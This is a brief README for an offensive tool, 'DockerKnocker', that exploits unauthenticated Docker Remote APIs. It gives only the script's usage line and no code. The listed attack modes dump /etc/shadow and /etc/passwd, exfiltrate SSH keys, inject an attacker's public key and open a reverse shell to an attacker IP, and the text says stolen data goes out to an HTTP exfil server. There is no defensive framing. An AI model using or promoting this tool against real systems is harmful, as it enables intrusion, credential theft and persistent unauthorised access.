# DockerKnocker
Exploits Unauth Docker API (Docker Remote API Detection)


```
usage: exploit.py [-h] --target TARGET --attack {dump-shadow,dump-passwd,exfil-ssh,inject-key,reverse-shell} [--user USER] [--pubkey PUBKEY] [--listen-port LISTEN_PORT] [--reverse-port REVERSE_PORT] [--attacker-ip ATTACKER_IP]
exploit.py: error: the following arguments are required: --target, --attack

```


This exfiltrates data out of band to an HTTP exfil server.
